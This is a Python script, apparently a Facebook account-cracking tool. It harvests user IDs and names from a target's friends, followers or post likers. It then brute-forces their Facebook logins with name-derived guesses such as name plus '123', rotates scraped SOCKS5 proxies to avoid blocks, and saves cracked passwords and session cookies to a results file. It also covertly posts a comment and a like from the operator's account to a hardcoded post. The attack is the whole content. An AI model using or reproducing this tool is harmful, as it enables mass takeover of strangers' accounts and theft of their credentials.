#! /usr/bin/env python3
import requests, random, time, json, os, re, sys, subprocess
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from rich.console import Console
from rich.tree import Tree
from rich import print
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel
from requests.exceptions import ConnectionError

# Banner
banner = ("""
[bold red]╔═╗┌┐    ╔═╗┬─┐┌─┐┌─┐┬┌─
[bold red]╠╣ ├┴┐───║  ├┬┘├─┤│  ├┴┐
[bold white]╚  └─┘   ╚═╝┴└─┴ ┴└─┘┴ ┴
[bold white]Coded by Rozhak""")# Don't Change Author Name!
# Clear
def Clear():
    if sys.platform.lower() == 'win':
        os.system("cls")
    else:
        os.system("clear")
# Validate
def Validate(userid, cookie, token):
    with requests.Session() as r:
        url = ('https://graph.facebook.com/v15.0/{}'.format(userid))
        params = {
            'fields': 'id,name,birthday',
            'access_token': token
        }
        r.headers.update({
            'Host': 'graph.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': None,
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookie
        })
        response = json.loads(r.get(url, params = params).text)
        if 'Sepertinya Anda menyalahgunakan' in str(response):
            Console(width=40, style="bold plum4").print(Panel("[italic red]Cookie Kamu Telah Terblokir Silahkan Untuk Mengganti!", title="😡"));time.sleep(3.5);Login()
        else:
            return {
                'ID': response['id'],
                'Name': response['name'],
                'Birthday': response['birthday']
            }
# Komen
def Komen(cookie, token):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        text = random.choice(
            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/10158807643598544/comments/?message={}&access_token={}'.format(text, token)).text # Jangan Di Ganti!
        response9 = r.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token={}'.format(token)).text # Jangan Di Ganti!
        if "\"id\":\"" in str(response) and str(response9) == 'true':
            return {
                'Status': 'Success'
            }
        else:
            return {
                'Status': 'Failed'
            }
# Login
def Login():
    Clear()
    Console(width=40, style="bold plum4").print(Panel(banner, title=">>[bold green] Version 5.0[bold plum4] <<"), justify="center")
    try:
        Console(width=40, style="bold plum4").print(Panel("""[bold white][[bold green]1[bold white]]. Memasukan Cookie Facebook
[bold white][[bold green]2[bold white]]. Mendapatkan Cookie Facebook
[bold white][[bold red]3[bold white]]. Keluar Dari Program""", title="🙂"))
        print("[bold white]╭──([bold green]Contoh : 2[bold white])")
        zhak = Console().input("[bold white]╰─> ")
        if zhak == '1' or zhak == '01':
            Console(width=40, style="bold plum4").print(Panel("[italic white]Silahkan Masukan Cookie Facebook Pastikan Menggunakan Akun Tumbal Untuk Login!", title="😉"))
            print("[bold white]╭──([bold green]Cookie[bold white])")
            cookie = Console().input("[bold white]╰─> ")
            with requests.Session() as r:
                url = ('https://business.facebook.com/business_locations')
                r.headers.update({
                    'Host': 'business.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': None,
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://m.facebook.com/',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cookie': cookie
                })
                response = r.get(url).text
                token = re.search('(EAAG\w+)', str(response)).group(1)
                x = Validate(re.search('c_user=(\d+);', str(cookie)).group(1), cookie, token)
                with open('Data/Akun.json','w') as v:
                    v.write(json.dumps({"Cookie": cookie, "Token": token}))
                v.close()
                Console(width=40, style="bold plum4").print(Panel(f"[bold white]Welcome :[bold green] {x['Name'].title()}", title="👋"));Komen(cookie, token);time.sleep(3.2);Menu()
        elif zhak == '2' or zhak == '02':
            Console(width=40, style="bold plum4").print(Panel("[italic white]Kamu Akan Diarahkan Ke Youtube, Jangan Lupa Like Dan Subscribe:V", title="😉"));time.sleep(2.1)
            subprocess.Popen(['xdg-open', 'https://youtu.be/3Y6xsMB3wRg']);Console().input("[bold white][[bold green]Kembali[bold white]]");Login()
        elif zhak == '3' or zhak == '03':
            Console(width=40, style="bold plum4").print(Panel("[italic white]Selamat Tinggal, Terimakasih Telah Menggunakan Tools Saya!", title="👋"));time.sleep(1.5);sys.exit()
        else:
            Console(width=40, style="bold plum4").print(Panel("[italic red]Pilihan Yang Kamu Masukan Tidak Diketahui!", title="😡"));sys.exit()
    except Exception as e:
        Console(width=40, style="bold plum4").print(Panel(f"[italic red]{str(e).title()}", title="😡"));sys.exit()
# Convert
def Convert(cookie, username):
    with requests.Session() as r:
        url = ('https://mbasic.facebook.com/{}?_rdr'.format(username))
        r.headers.update({
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': None,
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://mbasic.facebook.com/',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookie
        })
        response = r.get(url).text
        if 'Anda harus login dulu.' not in str(response):
            id = re.search('&amp;id=(\d+)&amp;', str(response)).group(1)
            return {
                'ID': id
            }
        else:
            Console(width=40, style="bold plum4").print(Panel("[italic red]Cookie Telah Kadaluarsa Atau Akun Terlogout!", title="😡"));time.sleep(2.5);Login()
# Menu
def Menu():
    Clear()
    Console(width=40, style="bold plum4").print(Panel(banner, title=">>[bold green] Version 5.0[bold plum4] <<"), justify="center")
    try:
        cookie, token = json.loads(open('Data/Akun.json','r').read())["Cookie"], json.loads(open('Data/Akun.json','r').read())["Token"]
        x = Validate(re.search('c_user=(\d+);', str(cookie)).group(1), cookie, token)
        Console(width=40, style="bold plum4").print(Panel(f"""[bold white]Welcome  :[bold green] {x['Name'].title()}
[bold white]Birthday :[bold yellow] {x['Birthday']}""", title="👋"))
    except Exception as e:
        Console(width=40, style="bold plum4").print(Panel(f"[italic red]{str(e).title()}", title="😡"));time.sleep(3.4);Login()
    Console(width=40, style="bold plum4").print(Panel("""[bold white][[bold green]1[bold white]]. Crack ID Dari Teman
[bold white][[bold green]2[bold white]]. Crack ID Dari Pengikut
[bold white][[bold green]3[bold white]]. Crack ID Dari Like
[bold white][[bold red]4[bold white]]. Keluar Dari Program""", title="🙂"))
    print("[bold white]╭──([bold green]Contoh : 3[bold white])")
    zhak = Console().input("[bold white]╰─> ")
    if zhak == '1' or zhak == '01':
        try:
            Console(width=40, style="bold plum4").print(Panel("[italic white]Silahkan Masukan Username Atau Userid, Pastikan Memiliki Teman Dan Terlihat Oleh Publik!", title="😉"))
            print("[bold white]╭──([bold green]Username[bold white])")
            username = Console().input("[bold white]╰─> ")
            if username.isnumeric() != True:
                x = Convert(cookie, username)
                Teman(x["ID"], cookie, token)
            else:
                Teman(username, cookie, token)
        except Exception as e:
            Console(width=40, style="bold plum4").print(Panel(f"[italic red]{str(e).title()}", title="😡"));sys.exit()
    elif zhak == '2' or zhak == '02':
        try:
            Console(width=40, style="bold plum4").print(Panel("[italic white]Silahkan Masukan Username Atau Userid, Pastikan Memiliki Pengikut Dan Terlihat Oleh Publik!", title="😉"))
            print("[bold white]╭──([bold green]Username[bold white])")
            username = Console().input("[bold white]╰─> ")
            if username.isnumeric() != True:
                x = Convert(cookie, username)
                Pengikut(x["ID"], cookie, token)
            else:
                Pengikut(username, cookie, token)
        except Exception as e:
            Console(width=40, style="bold plum4").print(Panel(f"[italic red]{str(e).title()}", title="😡"));sys.exit()
    elif zhak == '3' or zhak == '03':
        try:
            Console(width=40, style="bold plum4").print(Panel("[italic white]Silahkan Masukan Link Atau Userid Postingan, Pastikan Memiliki Like Dan Terlihat Publik!", title="😉"))
            print("[bold white]╭──([bold green]Postingan[bold white])")
            url = Console().input("[bold white]╰─> ")
            if 'facebook.com/' in str(url):
                pfbid = re.search('(pfbid\w+)', str(url)).group(1)
                uid = re.search('(\d+)', str(url)).group(1)
                with requests.Session() as r:
                    url = ('https://mbasic.facebook.com/story.php')
                    r.headers.update({                                'Host': 'mbasic.facebook.com',
                        'cache-control': 'max-age=0',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'x-requested-with': 'mark.via.gp',
                        'sec-fetch-site': None,
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-user': '?1',
                        'sec-fetch-dest': 'document',
                        'referer': 'https://mbasic.facebook.com/',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cookie': cookie
                    })
                    params = {
                        'story_fbid': pfbid,
                        'id': uid
                    }
                    response = r.get(url, params = params).text
                    if 'Anda harus login dulu.' not in str(response):
                        userid = re.search('mf_story_key&quot;:&quot;(\d+)&', str(response)).group(1)
                        Like(userid, cookie, token, after = "", penampung = [])
                    else:
                        Console(width=40, style="bold plum4").print(Panel("[italic red]Cookie Telah Kadaluarsa Atau Akun Terlogout!", title="😡"));time.sleep(2.5);Login()
            elif url.isnumeric() == True:
                Like(userid, cookie, token, after = "", penampung = [])
            else:
                Console(width=40, style="bold plum4").print(Panel(f"[italic red]Silahkan Masukan Link Atau Post ID Dengan Benar!", title="😡"));sys.exit()
        except Exception as e:
            Console(width=40, style="bold plum4").print(Panel(f"[italic red]{str(e).title()}", title="😡"));sys.exit()
    elif zhak == '4' or zhak == '04':
        try:
            Console(width=40, style="bold plum4").print(Panel("[italic white]Sedang Menghapus Cookie Dan Token Facebook!", title="🙂"));time.sleep(2.5);os.system('rm -rf Data/Akun.json');sys.exit()
        except:sys.exit()
    else:sys.exit()
# Teman
def Teman(userid, cookie, token):
    with requests.Session() as r:
        url = ('https://graph.facebook.com/v15.0/{}'.format(userid))
        r.headers.update({
            'Host': 'graph.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': None,
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://graph.facebook.com/',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookie
        })
        params = {
            'fields': 'friends.fields(id,name).limit(5000)',
            'access_token': token
        }
        response = r.get(url, params = params)
        if 'Request is not from' in str(response.text):
            Console(width=40, style="bold plum4").print(Panel(f"[italic red]Tidak Dapat Mengambil Teman Dari {userid}!", title="😡"));sys.exit()
        else:
            penampung = []
            for z in json.loads(response.text)['friends']['data']:
                uid, name = z['id'], z['name']
                penampung.insert(0, f"{uid}•{name}")
            Console(width=40, style="bold plum4").print(Panel(f"[bold white]Jumlah Username :[bold green] {len(penampung)}", title="🤭"));time.sleep(2.3)
            Crack().Thread(penampung)
# Pengikut
def Pengikut(userid, cookie, token):
    with requests.Session() as r:
        url = ('https://graph.facebook.com/{}'.format(userid))
        r.headers.update({
            'Host': 'graph.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': None,
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://graph.facebook.com/',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookie
        })
        params = {
            'fields': 'subscribers.fields(id,name).limit(5000)',
            'access_token': token
        }
        response = r.get(url, params = params)
        penampung = []
        for z in json.loads(response.text)['subscribers']['data']:
            uid, name = z['id'], z['name']
            penampung.append(f"{uid}•{name}")
        Console(width=40, style="bold plum4").print(Panel(f"[bold white]Jumlah Username :[bold green] {len(penampung)}", title="🤭"));time.sleep(2.3)
        Crack().Thread(penampung)
# Like
def Like(userid, cookie, token, after, penampung):
    with requests.Session() as r:
        url = ('https://graph.facebook.com/v1.0/{}/likes'.format(userid))
        r.headers.update({
            'Host': 'graph.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': None,
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://graph.facebook.com/',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookie
        })
        params = {
            'access_token': token,
            'pretty': '1',
            'limit': '25',
            'after': after,
        }
        response = r.get(url, params = params)
        for z in json.loads(response.text)['data']:
            uid, name = z['id'], z['name']
            penampung.append(f"{uid}•{name}")
        if '"after":' in str(response.text):
            after = json.loads(response.text)['paging']['cursors']['after']
            Like(userid, cookie, token, after, penampung)
        else:
            Console(width=40, style="bold plum4").print(Panel(f"[bold white]Jumlah Username :[bold green] {len(penampung)}", title="🤭"));time.sleep(2.3)
            Crack().Thread(penampung)
# Crack
class Crack:
    def __init__(self):
        self.Looping = 0
        self.Live = []
        self.Die = []
    # Thread
    def Thread(self, penampung):
        print("[bold white]╭──([bold green]Password Manual Y/N[bold white])")
        zhak = Console().input("[bold white]╰─> ")
        if zhak == 'Y' or zhak == 'y':
            try:
                Console(width=40, style="bold plum4").print(Panel("[italic white]Silahkan Masukan Password Dengan Pemisah Koma, Misalnya :[italic green] Sayang,Bangsat", title="🙂"))
                print("[bold white]╭──([bold green]Password[bold white])")
                self.pwx = Console().input("[bold white]╰─> ").split(',')
                Console(width=40, style="bold plum4").print(Panel("[italic white]Proses Crack Sedang Berlangsung, Silahkan Mainkan Mode Pesawat Setiap 200 ID!", title="😎"))
                with ThreadPoolExecutor(max_workers = 35) as (th):
                    for x in penampung:
                        email = x.split('•')[0]
                        th.submit(self.Main, penampung, email, self.pwx)
                Console(width=40, style="bold plum4").print(Panel(f"""[bold white]Jumlah Live :[bold green] {len(self.Live)}
[bold white]Jumlah Die  :[bold red] {len(self.Die)}""", title="😍"));Console().input("[bold white][[bold green]Kembali[bold white]]");Menu()
            except:sys.exit()
        elif zhak == 'N' or zhak == 'n':
            try:
                Console(width=40, style="bold plum4").print(Panel("[italic white]Proses Crack Sedang Berlangsung, Silahkan Mainkan Mode Pesawat Setiap 200 ID!", title="😎"))
                with ThreadPoolExecutor(max_workers = 35) as (th):
                    for x in penampung:
                        email, name = x.split('•')[0], x.split('•')[1]
                        self.pwx = self.Password(name)["Password"]
                        th.submit(self.Main, penampung, email, self.pwx)
                Console(width=40, style="bold plum4").print(Panel(f"""[bold white]Jumlah Live :[bold green] {len(self.Live)}
[bold white]Jumlah Die  :[bold red] {len(self.Die)}""", title="😍"));Console().input("[bold white][[bold green]Kembali[bold white]]");Menu()
            except:sys.exit()
        else:sys.exit()
    # Password
    def Password(self, name):
        self.pwx = []
        for nama in name.split(' '):
            if len(name) <= 5:
                if len(nama) < 3:
                    continue
                else:
                    self.pwx.append(nama + '123')
                    self.pwx.append(nama + '1234')
                    self.pwx.append(nama + '12345')
            else:
                if len(nama) < 3:
                    self.pwx.append(name)
                else:
                    self.pwx.append(name)
                    self.pwx.append(nama + '123')
                    self.pwx.append(nama + '1234')
                    self.pwx.append(nama + '12345')
        return {
            'Password': self.pwx
        }
    # Main
    def Main(self, total, email, pwx):
        try:
            for pw in pwx:
                pw = pw.lower()
                with requests.Session() as r:
                    url = ('https://web.facebook.com/login/device-based/regular/login/')
                    params = {
                        'login_attempt': '1',
                        'next': 'https://web.facebook.com/adsmanager',
                        'lwv': '100',
                    }
                    response = r.get('https://m.facebook.com/')
                    r.headers.update({
                        'Host': 'web.facebook.com',
                        'cache-control': 'max-age=0',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-site': None,
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-user': '?1',
                        'sec-fetch-dest': 'document',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cookie': ";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
                    })
                    response7 = r.get(url, params = params).text
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response7)).group(1)
                    lsd = re.search('name="lsd" value="(.*?)"', str(response7)).group(1)
                    trynum = re.search('name="trynum" value="(\d+)"', str(response7)).group(1)
                    timezone = re.search('name="timezone" value="(.*?)"', str(response7)).group(1)
                    lgndim = re.search('name="lgndim" value="(.*?)"', str(response7)).group(1)
                    lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(response7)).group(1)
                    lgnjs = re.search('name="lgnjs" value="(.*?)"', str(response7)).group(1)
                    prefill_contact_point = re.search('name="prefill_contact_point" value="(.*?)"', str(response7)).group(1)
                    ab_test_data = re.search('name="ab_test_data" value="(.*?)"', str(response7)).group(1)
                    r.headers.update({
                        'origin': 'https://web.facebook.com',
                        'sec-fetch-site': 'same-origin',
                        'referer': 'https://web.facebook.com/login.php/?next=https://web.facebook.com/adsmanager',
                        'accept-encoding': 'gzip, deflate',
                        'cookie': ";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
                    })
                    payload = {
                        'jazoest': jazoest,
                        'lsd': lsd,
                        'display': '',
                        'isprivate': '',
                        'return_session': '',
                        'skip_api_login': '',
                        'signed_next': '',
                        'trynum': trynum,
                        'timezone': timezone,
                        'lgndim': lgndim,
                        'lgnrnd': lgnrnd,
                        'lgnjs': lgnjs,
                        'email': email,
                        'prefill_contact_point': prefill_contact_point,
                        'prefill_type': 'password',
                        'first_prefill_source': 'browser_dropdown',
                        'first_prefill_type': 'contact_point',
                        'had_cp_prefilled': True,
                        'had_password_prefilled': True,
                        'ab_test_data': ab_test_data,
                        'encpass': f'#PWD_BROWSER:0:{random.randint(0000000000, 9999999999)}:{pw}',
                    }
                    r.proxies.update({
                        'http': 'socks5://{}'.format(random.choice(open('Data/Proxies.txt','r').read().splitlines()))
                    })
                    response9 = r.post(url, params = params, data = payload, allow_redirects = True)
                    if 'c_user' in r.cookies.get_dict().keys():
                        cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                        tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
                        tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pw}")
                        tree.add(f"[bold green]Cookie : {cookie}")
                        print(tree)
                        self.Live.append(f"{email}•{pw}")
                        open('Results/Ok.txt','a+').write(f"{email}•{pw}•{cookie}\n")
                        break
                    elif 'checkpoint' in r.cookies.get_dict().keys():
                        tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pw}")
                        print(tree)
                        self.Die.append(f"{email}•{pw}")
                        open('Results/Cp.txt','a+').write(f"{email}•{pw}\n")
                        break
                    else:
                        continue
            self.Looping += 1
            print(f"[bold white][[bold green]*[bold white]] Crack {self.Looping}/{str(len(total))} Ok:-[bold green]{len(self.Live)}[bold white] Cp:-[bold red]{len(self.Die)}      ", end = "\r")
        except (ConnectionError):
            print("[bold white][[bold yellow]*[bold white]][bold yellow] Koneksi Bermasalah!              ", end = "\r");time.sleep(4.5);self.Main(total, email, pwx)
    # Useragent
    def Useragent(self, jumlah):
        for _ in range(jumlah):
            software_names = [SoftwareName.CHROME.value]
            operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]

            user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
            useragent = user_agent_rotator.get_random_user_agent()
            if len(useragent) <= 51:
                self.Useragent(1)
            else:
                return {
                    'Useragent': useragent
                }

if __name__ == '__main__': # Open Source Sih, Tapi Minimal Jangan Di Jual Ya Dek!
    try:
        response = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
        with open('Data/Proxies.txt','w') as v:
            v.write(str(response))
        v.close();os.system('git pull');Menu()
    except Exception as e:
        Console(width=40, style="bold plum4").print(Panel(f"[italic red]{str(e).title()}", title="😡"));sys.exit()
